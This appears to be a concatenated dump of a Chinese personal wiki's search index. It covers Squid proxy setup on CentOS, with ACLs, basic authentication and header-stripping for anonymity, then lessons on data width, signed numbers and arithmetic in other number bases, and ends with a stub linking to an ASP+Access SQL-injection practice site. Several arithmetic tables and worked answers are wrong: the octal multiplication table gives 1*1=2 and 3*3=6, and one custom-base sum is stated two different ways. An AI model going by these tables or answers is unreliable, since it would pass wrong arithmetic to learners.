Squid 代理服务器｜2021 年中总结 针对外网的代理配置 squid安装与基础命令 环境：centos 1234[root@localhost squid]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)[root@localhost user]# uname -aLinux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 安装 1yum install -y squid 查看是否安装，将在已安装软件包中查找包含&quot;squid&quot;的软件包，并将其列出 1rpm -qa | grep squid 配置文件 squid配置文件位于/etc/squid/squid.conf，另外，该目录下有/etc/squid/squid.conf.default文件，是默认配置，修改squid.conf后想还原就用default文件覆盖回去。 以下是squid.conf文件的内容和各sections解读 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273## Recommended minimum configuration:## Example rule allowing access from your local networks.# Adapt to list your (internal) IP networks from where browsing# should be allowedacl localnet src 10.0.0.0/8\t# RFC1918 possible internal networkacl localnet src 172.16.0.0/12\t# RFC1918 possible internal networkacl localnet src 192.168.0.0/16\t# RFC1918 possible internal networkacl localnet src fc00::/7 # RFC 4193 local private network rangeacl localnet src fe80::/10 # RFC 4291 link-local (directly plugged) machinesacl SSL_ports port 443acl Safe_ports port 80 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl Safe_ports port 70 # gopheracl Safe_ports port 210 # waisacl Safe_ports port 1025-65535\t# unregistered portsacl Safe_ports port 280 # http-mgmtacl Safe_ports port 488 # gss-httpacl Safe_ports port 591 # filemakeracl Safe_ports port 777 # multiling httpacl CONNECT method CONNECT## Recommended minimum Access Permission configuration:## Deny requests to certain unsafe portshttp_access deny !Safe_ports# Deny CONNECT to other than secure SSL portshttp_access deny CONNECT !SSL_ports# Only allow cachemgr access from localhosthttp_access allow localhost managerhttp_access deny manager# We strongly recommend the following be uncommented to protect innocent# web applications running on the proxy server who think the only# one who can access services on &quot;localhost&quot; is a local user#http_access deny to_localhost## INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS## Example rule allowing access from your local networks.# Adapt localnet in the ACL section to list your (internal) IP networks# from where browsing should be allowedhttp_access allow localnethttp_access allow localhost# And finally deny all other access to this proxyhttp_access deny all# Squid normally listens to port 3128http_port 3128# Uncomment and adjust the following to add a disk cache directory.#cache_dir ufs /var/spool/squid 100 16 256# Leave coredumps in the first cache dircoredump_dir /var/spool/squid## Add any of your own refresh_pattern entries above these.#refresh_pattern ^ftp: 1440\t20%\t10080refresh_pattern ^gopher:\t1440\t0%\t1440refresh_pattern -i (/cgi-bin/|\\?) 0\t0%\t0refresh_pattern . 0\t20%\t4320 简略版解读详尽版解读 The first section sets up ACLs (Access Control Lists) for different types of networks and ports. The acl localnet lines define IP address ranges that are allowed to access the proxy, while the acl SSL_ports and acl Safe_ports lines specify which ports are allowed for HTTPS and other protocols respectively. The second section specifies the minimum access permissions that should be configured for the proxy. The http_access deny lines restrict access to unsafe ports and disallow CONNECT to non-SSL ports, while http_access allow lines allow access to the local network and localhost. The third section sets up the port that Squid listens on (default is 3128) and specifies the directory where core dumps should be stored in case of a crash. The fourth section defines the refresh patterns for cached objects. These rules determine how long cached objects should be kept and how often they should be refreshed. ACL Section The acl localnet lines define IP address ranges that are allowed to access the proxy. By default, the ACL allows access from the RFC1918 private IP address ranges (10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16), as well as from the fc00::/7 and fe80::/10 address ranges. The acl SSL_ports line specifies the HTTPS port (443) as the only port that should be allowed for secure connections. The acl Safe_ports lines list several ports that should be allowed for various types of traffic, such as HTTP (port 80), FTP (port 21), HTTPS (port 443), and others. The acl CONNECT method CONNECT line allows the CONNECT method, which is used for establishing SSL tunnel connections. Access Permission Section The http_access deny lines specify which types of requests should be denied. The !Safe_ports argument after deny blocks all requests to ports other than those listed in Safe_ports. The CONNECT !SSL_ports argument after deny blocks all SSL tunnel requests to non-HTTPS ports. The http_access allow lines specify which types of requests should be allowed. The localhost argument after allow allows requests originating from the proxy host itself. The localnet argument after allow allows requests originating from the IP ranges defined in the acl localnet section. The http_access deny all line blocks all other requests, effectively restricting access to the proxy to only those specified in the http_access allow lines. Port and Core Dump Directory Section The http_port line specifies the port on which Squid should listen for incoming connections. By default, this is set to port 3128. The coredump_dir line specifies the directory where core dump files should be stored in case of a crash. By default, this is set to /var/spool/squid. Refresh Pattern Section The refresh_pattern lines specify how frequently Squid should check for new versions of cached objects. The first argument (^ftp: and ^gopher:) specifies which types of requests the pattern should match. The second argument (1440 and 0) specifies the number of minutes after which Squid should check for updates. The third argument (20% and 0%) specifies the percentage of the object’s age that should be used to determine when to refresh the object. The fourth argument (10080 and 1440) specifies the maximum age of the object in minutes before it should be removed from the cache. The -i (/cgi-bin/|\\?) line specifies a regular expression to match URLs that should never be cached, and the final refresh_pattern . line specifies that all other URLs should be refreshed according to the other refresh pattern rules. 端口 12# Squid normally listens to port 3128http_port 3128 默认端口3128。如果对外是动态分配的，则无法固定IP。如果需要对内部的局域网服务，可写成： 1http_port 192.168.228.180:3128 访问控制列表 squid从上往下读取acl规则，当一个规则匹配到时，就会允许，就不再往下匹配，所以acl的顺序很重要。 squid可通过IP地址、主机名、MAC地址、用户/密码认证等方式识别及控制对外访问，还可限制时间段等。 ACL的基本格式是： 1acl 列表名称 控制方式 控制目标 如果是虚拟机环境，因为squid配置文件中默认允许私有地址192.168.0.0/16使用squid代理，所以只要确保squid启动，就能让其他内网虚拟机来使用该代理，点此跳转到如何使用 不建议http_access allow all，直接放行所有http请求来源，如果是自己搭建的测试环境，则无所谓 检查配置文件 使用该命令检查配置是否有误，如果有误，会输出相应错误，如果无误，会输出具体配置信息 1squid -k parse 防火墙放行3128端口 1234567891011121314 # 把 3128 端口加入防火墙过滤掉 # firewall-cmd --permanent --zone=public --add-port=3128/tcp # 重启防火墙 # firewall-cmd --reload​\t如果Squid在另一个非默认端口上运行，则需要允许该端口上的流量通过。4. 基础命令 初始化服务（记一下，不一定要运行） ~~~shell squid -z 启动、重启、开机自启动命令： 123systemctl start squidsystemctl restart squidsystemctl enable squid 查看squid状态 1systemctl status squid 关闭时建议使用 1squid -k shutdown 循环读取显示日志 1squid -ztail -f /var/log/squid/access.log 配置认证代理 增加用户名密码的认证方式来做权限控制 需要安装htpasswd，该工具集成在apache httpd的tools里 1yum install httpd-tools -y 安装完成之后执行 htpasswd，如果没有提示找不到命令，则说明安装成功。 接下来创建保存用户名密码的文件： 12touch /etc/squid/squid_passwdchown squid /etc/squid/squid_passwd 注意授权的时候要弄清楚squid运行时的用户名，一般是squid或者proxy。 然后执行： 1234htpasswd /etc/squid/squid_passwd usernameNew password:Re-type new password:Adding password for user username 注意把 username 换成你想要的用户名，密码位数不能超过8位。比如我这里账户名设username，密码为admin 如果想要继续添加用户，请多次执行这条命令。 命令格式： htpasswd [选项] 文件名 用户名 常用选项 -c 创建新文件，如果没加此选项会把新增的用户添加在末尾 -2 SHA-256格式的密码 -5 SHA-512格式的密码 -B bcrypt格式的密码 -d CRYPT格式的密码 -s SHA-1格式的密码 查看验证文件，安装squid时会自动装上这个验证文件 123[root@localhost user]# rpm -ql squid | grep ncsa/usr/lib64/squid/basic_ncsa_auth/usr/share/man/man8/basic_ncsa_auth.8.gz 测试密码文件 1234[root@localhost user]# /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdusername Admin@123OK# 测试完成，crtl + c 打断 接下来修改 /etc/squid/squid.conf 文件让squid使用验证，在 http_access deny all 之前加上下面几句： 注释版直接复制版123456789auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd #选择的认证方式为basic，认证程序路径和密码文件路径 #注意第一个文件路径要和刚才rpm -ql squid | grep ncsa找的路径一样，第二个文件路径是之前创建用于保存用户名密码的密码文件路径auth_param basic children 5 #认证程序的进程数，最多5个账户同时运行auth_param basic realm Squid proxy-caching web server #用户输入用户名密码时看到的提示信息auth_param basic credentialsttl 2 hours #认证有效时间，用户名和密码的缓存时间，也就是说同一个用户名多久会调用 ncsa_auth 一次auth_param basic casesensitive off #用户名是否需要匹配大小写acl ncsa_users proxy_auth REQUIRED #所有成功鉴权的用户都归于 ncsa_users 组http_access allow ncsa_users #允许 ncsa_users 组的用户使用 Proxy1234567auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users 提示最后说一个小坑，apache httpd 2.2 版本和 2.4 版本的 htpasswd 生成的密码文件格式是不一样的。只有 2.2 版本的能用。如果按照教程设置成功以后发现用户名密码死活不对，文件权限也没有问题的话，那就要看一下是不是 htpasswd 的问题了。 直接输入 /usr/lib/squid/ncsa_auth /etc/squid/squid_passwd 然后输入 username passwd 可以手动运行一下 ncsa_auth 程序，看看是否是密码文件的问题。 如果提示 OK 那么说明没有问题，提示 ERR Wrong password 则说明要么是密码输错了，要么是密码文件的格式有问题。 一个例子 1vi /etc/squid/squid.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384## Recommended minimum configuration:## Example rule allowing access from your local networks.# Adapt to list your (internal) IP networks from where browsing# should be allowedacl localnet src 10.0.0.0/8\t# RFC1918 possible internal networkacl localnet src 172.16.0.0/12\t# RFC1918 possible internal networkacl localnet src 192.168.0.0/16\t# RFC1918 possible internal networkacl localnet src fc00::/7 # RFC 4193 local private network rangeacl localnet src fe80::/10 # RFC 4291 link-local (directly plugged) machinesacl SSL_ports port 443acl Safe_ports port 80 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl Safe_ports port 70 # gopheracl Safe_ports port 210 # waisacl Safe_ports port 1025-65535\t# unregistered portsacl Safe_ports port 280 # http-mgmtacl Safe_ports port 488 # gss-httpacl Safe_ports port 591 # filemakeracl Safe_ports port 777 # multiling httpacl CONNECT method CONNECT+ acl client src 192.168.242.165+ http_access allow client+ auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd+ auth_param basic children 5+ auth_param basic realm Squid proxy-caching web server+ auth_param basic credentialsttl 2 hours+ auth_param basic casesensitive off+ acl ncsa_users proxy_auth REQUIRED+ http_access allow ncsa_users## Recommended minimum Access Permission configuration:## Deny requests to certain unsafe portshttp_access deny !Safe_ports# Deny CONNECT to other than secure SSL portshttp_access deny CONNECT !SSL_ports# Only allow cachemgr access from localhosthttp_access allow localhost managerhttp_access deny manager# We strongly recommend the following be uncommented to protect innocent# web applications running on the proxy server who think the only# one who can access services on &quot;localhost&quot; is a local user#http_access deny to_localhost## INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS## Example rule allowing access from your local networks.# Adapt localnet in the ACL section to list your (internal) IP networks# from where browsing should be allowedhttp_access allow localnethttp_access allow localhost# And finally deny all other access to this proxyhttp_access deny all# Squid normally listens to port 3128http_port 3128# Uncomment and adjust the following to add a disk cache directory.#cache_dir ufs /var/spool/squid 100 16 256# Leave coredumps in the first cache dircoredump_dir /var/spool/squid## Add any of your own refresh_pattern entries above these.#refresh_pattern ^ftp: 1440\t20%\t10080refresh_pattern ^gopher:\t1440\t0%\t1440refresh_pattern -i (/cgi-bin/|\\?) 0\t0%\t0refresh_pattern . 0\t20%\t4320 客户端ip为192.168.242.165不需要验证，直接能使用代理上网。 12acl client src 192.168.242.165http_access allow client 其他能access the proxy的客户端都要认证 1234567auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users 如果去掉 删减内容完整版1- http_access allow client123456789acl client src 192.168.242.165auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwdauth_param basic children 5auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hoursauth_param basic casesensitive offacl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users 192.168.242.165上网也需要认证，为什么？从现在的conf看，acl只是定义了client组，client组里有192.168.242.165这个客户端，然后遇到认证的那几条，并且只允许认证后的客户端的请求http_access allow ncsa_users。 原因： In your squid configuration file, the line “acl client src 192.168.242.165” defines an access control list (ACL) named “client” that includes only the IP address 192.168.242.165. The next line “http_access allow client” grants access to this ACL without requiring authentication. Therefore, any client with the IP address 192.168.242.165 will be able to access the proxy server without authentication. If you remove the line “http_access allow client”, all clients will require authentication including the client with the IP address 192.168.242.165. Regarding the question about the need for authentication for clients on the localnet, the ACL “localnet” includes IP addresses from 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16, which cover a range of private IP addresses. However, this does not automatically grant access to these clients without authentication. You still need to define an ACL and grant access accordingly, as you have done with the “client” ACL in your configuration file. 因为acl只是定义了一个请求或客户端是否允许或拒绝访问代理服务器的条件，而http_access规则确定了根据这些条件的结果应该采取的行动。它们要一起搭配使用。 An access control list (ACL) in Squid is used to define a list of conditions that are used to match requests or clients. ACLs are used in combination with http_access rules to determine which requests or clients are allowed to access the proxy server. http_access rules in Squid are used to define the access policy for incoming requests. They are used to control which clients or requests are allowed or denied access to the proxy server, based on the conditions defined in the ACLs. In other words, ACLs define the conditions that are used to determine whether a request or client is allowed or denied access to the proxy server, while http_access rules determine the actions that should be taken based on the results of these conditions. For example, you might define an ACL that matches requests from a particular domain name, and then use an http_access rule to allow or deny access based on that ACL. Or, you might define an ACL that matches a particular IP address range, and then use an http_access rule to grant or deny access based on that ACL. Overall, ACLs and http_access rules work together to provide granular control over which clients or requests are allowed to access the proxy server, and what actions should be taken for each request or client. 进阶配置（未试，只是记录） 匿名 默认情况下，Squid 会添加很多和客户信息相关的 HTTP 头，如 X-Forwarded-For 这类。如果想要做到高度匿名，需要将这些头去掉。在 squid.conf 里面添加如下的配置： 123456789101112131415161718192021222324252627282930forwarded_for offrequest_header_access Allow allow allrequest_header_access Authorization allow allrequest_header_access WWW-Authenticate allow allrequest_header_access Proxy-Authorization allow allrequest_header_access Proxy-Authenticate allow allrequest_header_access Cache-Control allow allrequest_header_access Content-Encoding allow allrequest_header_access Content-Length allow allrequest_header_access Content-Type allow allrequest_header_access Date allow allrequest_header_access Expires allow allrequest_header_access Host allow allrequest_header_access If-Modified-Since allow allrequest_header_access Last-Modified allow allrequest_header_access Location allow allrequest_header_access Pragma allow allrequest_header_access Accept allow allrequest_header_access Accept-Charset allow allrequest_header_access Accept-Encoding allow allrequest_header_access Accept-Language allow allrequest_header_access Content-Language allow allrequest_header_access Mime-Version allow allrequest_header_access Retry-After allow allrequest_header_access Title allow allrequest_header_access Connection allow allrequest_header_access Proxy-Connection allow allrequest_header_access User-Agent allow allrequest_header_access Cookie allow allrequest_header_access All deny all 也看到另一种高匿写法： 123request_header_access X-Forwarded-For deny allrequest_header_access From deny allrequest_header_access Via deny all 去除相关主机信息 默认情况下，Squid 会把主机相关的信息发送出去，并显示在错误页面。加上下面两句去掉这些信息： 1234# add this to /etc/squid/squid.confvisible_hostname mybogusproxyhostname.local# and while we are at it stop squid blabbing about it&#x27;s version aswellhttpd_suppress_version_string on 使用代理 Windows 老版本ie浏览器（比如win7下的），在ie浏览器 如果有认证，会弹窗 Google浏览器,使用默认的系统代理。 Edge浏览器，认证弹窗长这样： 表单保存 Firefox 常规-连接设置 使用后 使用代理的机器，可以看到与代理服务器之间的建连（请求一个网页是多文件请求，所以会有多连接） squid上的日志可以看到 Linux [Linux搭建squid服务实现内网机器代理上网]"},{"title":"数据宽度","path":"/wiki/representation_and_computation_of_data/数据宽度.html","content":"这是一段摘要 数学上的数字，没有大小限制，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 位（BIT） █（1位） 字节（Byte） █|█|█|█|█|█|█|█（8位） 字（Word） █|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█（16位、2个字节） 双字（Doubleword） █|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█（32位、2个字、4个字节） 四字（Quadword） █|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|██|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█|█（64位、2个双字、4个字、8个字节）"},{"title":"数的表示","path":"/wiki/representation_and_computation_of_data/数的表示.html","content":"引言 上一节课讲到了数据宽度，比如，如果数据宽度为一个字节，那么存储的数据范围就是:0～xFF。 知道了数据的宽度和范围后，如何解释这个数据？ 计算机数据只有0和1，如何解释数据，取决于你解析的编码规则。 课本上的概念 无符号数和有符号数 无符号数编码规则： 各个位按2的幂次方相加 有符号数编码规则： 最高位为0，编码规则与无符号数一样 最高位为1，为负数 原码 最高位为符号位，其余各位为数值本身的绝对值 反码 正数：反码与原码相同 负数：符号位为1，其余位对原码取反; 补码 正数：补码与原码相同 负数：符号位为1，其余位对原码取反加1;（速算，除符号位外，从右往左第1个数字1，左边全部取反） 海哥的讲法 假设宽度是1个字节。对于计算机而言，就是16个数据存储在计算机中： 二进制表示 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 十六进制表示 0 1 2 3 4 5 6 7 8 9 A B C D E F 而如何使用（解释）这些数据，取决于程序员的视角。 假如，我想用这些数字都存无符号数，那么这16个数，就表示0~16这16个正数。F+1=？因为数据宽度的原因，超过的部分被舍弃，所以F+1=0，又回到了起点。 假如，我想让这些数字也能表示部分负数，怎么办？公平点，砍一半，0~7表示正数，8-&gt;F表示负数。 数学中0既不是正数也不是负数，在文章这里将0当成正数。 正数 0 1 2 3 4 5 6 7 负数 -1 -2 -3 -4 -5 -6 -7 -8 负数对应的符号为 F E D C B A 9 8 在这种情况下，观察发现：正数最高位是0，负数最高位是1 0-&gt;7，正数由小到大 8-&gt;F，负数，由小到大（F，-1是最大的负数） F+1，进位舍弃，变成0。 宽度是2个字节的同理。 宽度是4个字（32位）的同理。数据的范围如下： 无符号数：0 1 2 3 4 … FFFFFFFF 有符号数：从中间砍一刀，0-7FFFFFFF是正数；80000000-FFFFFFFF是负数。 正数最高位是0，负数最高位是1"},{"title":"进制","path":"/wiki/representation_and_computation_of_data/进制.html","content":"进制学习的障碍 学习其他进制，总以熟悉的十进制为依托进行学习，这种学习方法是错误的。其实没必要转，每一种进制都是完美，具有自己独立体系的。想学好进制首先要忘掉十进制，和进制间的转换！ 定义 一进制的定义：由1个符号组成，分别是1，逢一进一 八进制的定义：由8个符号组成，分别是0，1，2，3，4，5，6，7，逢八进一 十进制的定义：由10个符号组成，分别是0，1，2，3，4，5，6，7，8，9，逢十进一 N进制的定义：由N个符号组成，这N个符号可以自由定义，逢N进一 进制的书写 一进制 一进制的定义：由1个符号组成，分别是1，逢一进一 1进制的1-20。古人用的结绳记事就是1进制，1个结代表1 用符号1表示 用符号a表示 111111111111111 aaaaaaaaaaaaaaa 三进制 三进制的定义：由3个符号组成，分别是0，1，2，逢3进一 3进制的0-20 0 1 2 10 11 12 20 21 22 100 101 102 110 111 112 120 121 122 200 201 202 0、1、2，三个数，逢3进一。逐位，查数，写出来 七进制 七进制的定义：由7个符号组成，分别是0，1，2，3，4，5，6，逢7进一 0 1 2 3 4 5 6 10 11 12 13 14 15 16 20 21 22 23 24 25 26 进制的符号 深度理解进制，N进制规定了由N个符号组成，其实这N个符号可以由你自己来定 用途：进制的加密 十进制的定义:由十个符号组成，分别是0，1，3，2，8，7，6，9，4，5逢十进一。那么这种情况下，1+1=3 十进制的定义:由十个符号组成,分别是A，S，B，L，K，7，6，V，9，5逢十进一。 进制的运算 本质就是查数，把数全部写出来，然后往后查。比如八进制 0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 30 31 32 33 34 35 36 37 40 41 42 43 44 45 46 47 50 51 52 53 54 55 56 57 60 61 62 63 64 65 66 67 70 71 72 73 74 75 76 77 100 101 102 103 104 105 106 107 110 111 112 113 114 115 116 117 但如果数字一大就太麻烦了，所以先制作加法表，减法表，乘法表，除法表，然后查表 八进制运算 2+3=? 2×3=? 4×5=? 277+333=? 276*54=? 236-54=? 234/4=? 我们熟悉十进制是因为我们对于十进制的加法表，减法表，乘法表，除法表非常熟。对于八进制，如果有这四张表，我们也可以直接进行八进制的运算。 这里做两张表就够了，加法表，加法和减法都用这张表；乘法表，乘法和除法都用这张表。 0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 加法表 加几，就在上面的表移动几位。比如5+7，在上面表格5开始，向右移动7位，移1位6，移2位7，移3位10，移4位11，移5位12，移6位13，移7位14 1+1=2 1+2=3 2+2=4 1+3=4 2+3=5 3+3=6 1+4=5 2+4=6 3+4=7 4+4=10 1+5=6 2+5=7 3+5=10 4+5=11 5+5=12 1+6=7 2+6=10 3+6=11 4+6=12 5+6=13 6+6=14 1+7=10 2+7=11 3+7=12 4+7=13 5+7=14 6+7=15 7+7=16 乘法表 2*2就是2+2，查表，从2开始，向右移2位，得到4.然后算2×3时，在4的基础上再加2 1*1=2 1*2=3 2*2=4 1*3=3 2*3=6 3*3=6 1*4=4 2*4=10 3*4=11 4*4=20 1*5=5 2*5=12 3*5=14 4*5=24 5*5=31 1*6=6 2*6=14 3*6=17 4*6=30 5*6=36 6*6=44 1*7=7 2*7=16 3*7=22 4*7=34 5*7=43 6*7=52 7*7=61 有了表之后，做题。根据表来做题： 2+3=5 2×3=6 4×5=24 277+333=? 1234 277+333---- 632 236-54= 加法表当减法表用，比如哪位+3=10，查一下，查出是5 1234 236- 54---- 162 276*54=? 1234567 276 × 54------ 1370 1666 ------ 20250 234/4=? 4×几离23最近，是4，23-20=3，34，4×几是34，是7 123456789 47 -----4)234 20 ----- 34 34 ----- 0 小结 每种进制都是完美的，它自身就是一个完整的体系，可以直接做各种运算。 练习 编制7进制加法表，乘法表，并计算下面的结果:23456+54356=? 5621-654=? 234*65=? 答案表01234561011121314151620212223242526303132333435364041424344454650515253545556加法表1+1=21+2=32+2=41+3=42+3=53+3=61+4=52+4=63+4=104+4=111+5=62+5=103+5=114+5=125+5=131+6=102+6=113+6=124+6=135+6=146+6=15乘法表1*1=21*2=32*2=41*3=32*3=63*3=121*4=42*4=113*4=154*4=221*5=52*5=133*5=214*5=265*5=341*6=62*6=153*6=244*6=335*6=426*6=51有了表之后，做题。根据表来做题：23456+54356=?1234 23456+54356------111145 5621-654=?1234 5621- 654------ 4634234*65=?1234567 234× 65------ 1536 2103------- 22566 编制16进制加法表，乘法表，并计算下面的结果:2D4E6+CF3A6=? 5FD1-E5A=? 2CA*A5=? 答案表0123456789ABCDEF101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F加法表1+1=21+2=32+2=41+3=42+3=53+3=61+4=52+4=63+4=74+4=81+5=62+5=73+5=84+5=95+5=A1+6=72+6=83+6=94+6=A5+6=B6+6=C1+7=82+7=93+7=A4+7=B5+7=C6+7=D7+7=E1+8=92+8=A3+8=B4+8=C5+8=D6+8=E7+8=F8+8=101+9=A2+9=B3+9=C4+9=D5+9=E6+9=F7+9=108+9=119+9=121+A=B2+A=C3+A=D4+A=E5+A=F6+A=107+A=118+A=129+A=13A+A=141+B=C2+B=D3+B=E4+B=F5+B=106+B=117+B=128+B=139+B=14A+B=15B+B=161+C=D2+C=E3+C=F4+C=105+C=116+C=127+C=138+C=149+C=15A+C=16B+C=17C+C=181+D=E2+D=F3+D=104+D=115+D=126+D=137+D=148+D=159+D=16A+D=17B+D=18C+D=19D+D=1A1+E=F2+E=103+E=114+E=125+E=136+E=147+E=158+E=169+E=17A+E=18B+E=19C+E=1AD+E=1BE+E=1C1+F=102+F=113+F=124+F=135+F=146+F=157+F=168+F=179+F=18A+F=19B+F=1AC+F=1BD+F=1CE+F=1DE+F=1E乘法表1*1=11*2=22*2=41*3=32*3=63*3=91*4=42*4=83*4=C4*4=101*5=52*5=A3*5=F4*5=145*5=191*6=62*6=C3*6=124*6=185*6=1E6*6=241*7=72*7=E3*7=154*7=1C5*7=236*7=2A7*7=311*8=82*8=103*8=184*8=205*8=286*8=307*8=388*8=401*9=92*9=123*9=1B4*9=245*9=2D6*9=367*9=3F8*9=489*9=511*A=A2*A=143*A=1E4*A=285*A=326*A=3C7*A=468*A=509*A=5AA*A=641*B=B2*B=163*B=214*B=2C5*B=376*B=427*B=4D8*B=589*B=63A*B=6EB*B=791*C=C2*C=183*C=244*C=305*C=3C6*C=487*C=548*C=609*C=6CA*C=78B*C=84C*C=901*D=D2*D=1A3*D=274*D=345*D=416*D=4E7*D=5B8*D=689*D=75A*D=82B*D=8FC*D=9CD*D=A91*E=E2*E=1C3*E=2A4*E=385*E=466*E=547*E=628*E=709*E=7EA*E=8CB*E=9AC*E=A8D*E=B6E*E=C41*F=F2*F=1E3*F=2D4*F=3C5*F=4B6*F=5A7*F=698*F=789*F=87A*F=96B*F=A5C*F=B4D*F=C3E*F=D2F*F=E1有了表之后，做题。根据表来做题：2D4E6+CF3A6=?1234 2D4E6+CF3A6------ FC88C5FD1-E5A=?1234 5FD1- E5A------ 51772CA*A5=?1234567 2CA× A5------ DF2 1BE4------- 1CC32 9进制定义，由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1：计算:123 + 234 = ? 答案写完第1行，写到3，如何写下一行？123456783+1表示3往后查1个数，是292确定了第2行的第一个数是什么，然后按竖列找规律写完那一行所以就是换行时要算一下，其他的数按规律来写第0个数第1个数第2个数第3个数第4个数第5个数第6个数第7个数第8个数2917654839299919796959498931219111716151418137279717776757478736269616766656468635259515756555458534249414746454448438289818786858488833239313736353438339221234 123+ 234------ 725最后一位：3+4，4是第6个数，所以将3往查6个数，3-&gt;2-&gt;9-&gt;1-&gt;7-&gt;6-&gt;5，是5；且进1位倒数第二位：2+3，3是第8个数，所以将2往后走查8个数，是3，加上进位，再查1个数，所以是2；且进1位倒数第三位：1+2，2是第0个数，所以将1往后走查0个数，是1，加上进位，再查1个数，所以是7。结果：724 10进制定义，由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1：计算： @$$B + %AC&amp; = ? 答案第0个数第1个数第2个数第3个数第4个数第5个数第6个数第7个数第8个数第9个数!@$%^&amp;*ABC@!@@@$@%@^@&amp;@*@A@B@C$!$@$$%^&amp;*ABC%!%@%$%%^%&amp;%*%A%B%C%^!^@^$^%^^^&amp;^*^A^B^C&amp;!&amp;@&amp;$&amp;%&amp;^&amp;&amp;&amp;*&amp;A&amp;B&amp;C*!*@*$*%*^*&amp;***A*B*CA!A@A$A%A^A&amp;A*AAABACB!B@B$B%B^B&amp;B*BABBBCC!C@C$C%C^C&amp;C*CACBCC1234 @$$B+ %AC&amp;-------- &amp;!$%123456789最后一位：B+&amp;，&amp;是第5个数，所以将B往查5个数，B-&gt;C-&gt;!-&gt;@-&gt;$-&gt;%，是%；且进1位倒数第二位：$+C，C是第9个数，所以将$往后走查9个数，是@，加上进位，再查1个数，所以是$；且进1位倒数第三位：$+A，A是第7个数，所以将@往后走查7个数，是C，加上进位，再查1个数，所以是!；且进1位倒数第四位：@+%，%是第3个数，所以将@往后走查3个数，是^，加上进位，再查1个数，所以是&amp;；无进位。 结果：&amp;!$% 小结： 自定义符号的进制写表时，换行时将当前这个数字+1，这个1表示往后查1个数，算出下一行的第1个数。完了，找规律填完这一行。所以，只是换行时要算一下，其他的可以找规律写完。 运算时，比如：x+y，看y是代表第几个数，就将x往后查几个数，得出结果，有进位做下一位运算时多查1个数。 根据上面的小结，编程实现一个函数，该函数能够输出任意进制的第N个数。结果=fn(进制,第N个数)。比如，fn(2,100)返回1100011，fn(8.100)返回143，fn(16,100)返回63。 答案这是一个使用C语言编写的函数，该函数可以输出任意进制的第N个数。请注意，我们从0开始计数，所以第N个数实际上是N-1。12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char* fn(int base, int n) &#123; char* result = (char*) malloc(33); // 为结果分配内存，最大32位加上结束符&#x27;\\0&#x27; int i = 0; n--; // 从0开始计数 do &#123; int remainder = n % base; if (remainder &lt; 10) &#123; result[i++] = &#x27;0&#x27; + remainder; &#125; else &#123; result[i++] = &#x27;A&#x27; + (remainder - 10); &#125; n /= base; &#125; while (n &gt; 0); result[i] = &#x27;\\0&#x27;; // 添加结束符 // 反转字符串 for (int j = 0; j &lt; i / 2; j++) &#123; char temp = result[j]; result[j] = result[i - j - 1]; result[i - j - 1] = temp; &#125; return result;&#125;int main() &#123; printf(&quot;%s &quot;, fn(2, 100)); // 输出: 1100011 printf(&quot;%s &quot;, fn(8, 100)); // 输出: 143 printf(&quot;%s &quot;, fn(16, 100)); // 输出: 63 return 0;&#125;这个函数首先将数字转换为给定的基数，然后将结果存储在字符串中。然后，它反转字符串，因为我们是从最低有效位开始计算的。最后，它返回结果字符串。请注意，这个函数假设你想要的是大写字母来表示大于9的数字（对于16进制）。如果你想要小写字母，你可以在代码中做适当的修改。 二进制的简写形式 可以理解为十六进制符号就是4位二进制数的符号替换，而不是逐位2的几次方+2的几次方算出来。 对于二进制和十六进制之间的转换，要熟练。"},{"title":"Microsoft Access","path":"/wiki/sql_injection_env/Microsoft_Access.html","content":"超级小旋风aspWebServer+一套ASP+ACCESS带SQL注入网站源码 标题 链接 备注 超级小旋风aspWebServer https://cloud.tencent.com/developer/article/2148809 